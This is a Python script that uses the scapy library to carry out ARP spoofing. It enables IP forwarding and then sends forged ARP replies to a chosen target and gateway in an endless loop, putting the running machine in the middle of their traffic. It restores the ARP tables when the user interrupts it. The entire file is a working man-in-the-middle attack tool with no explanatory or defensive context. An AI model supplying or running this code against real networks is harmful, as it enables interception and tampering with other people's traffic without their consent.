import scapy.all as scapy
import optparse
import time
import subprocess as sp

sp.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter target ip address")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter gateway ip address")

    inputs = parse_object.parse_args()[0]
    if not inputs.target_ip:
        print("Enter target ip address!")
    if not inputs.gateway_ip:
        print("Enter gateway ip address!")

    return inputs


def get_mac_address(ip):
    arp_req_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_req_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def arp_spoofing(target_ip, gateway_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac, psrc=gateway_ip)
    scapy.send(arp_response, verbose=False)


def reset_spoofing(target_ip, gateway_ip):
    target_mac = get_mac_address(target_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=5)





packet_count = 0

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    while True:
        arp_spoofing(user_target_ip,user_gateway_ip)
        arp_spoofing(user_gateway_ip,user_target_ip)
        packet_count += 2
        print("\rSending packets " + str(packet_count), end="")
        time.sleep(3)


except PermissionError:
    print("\nYou must be root!")

except KeyboardInterrupt:
    print("\nArp spoofing stopped")
    reset_spoofing(user_target_ip, user_gateway_ip)
    reset_spoofing(user_gateway_ip, user_target_ip)

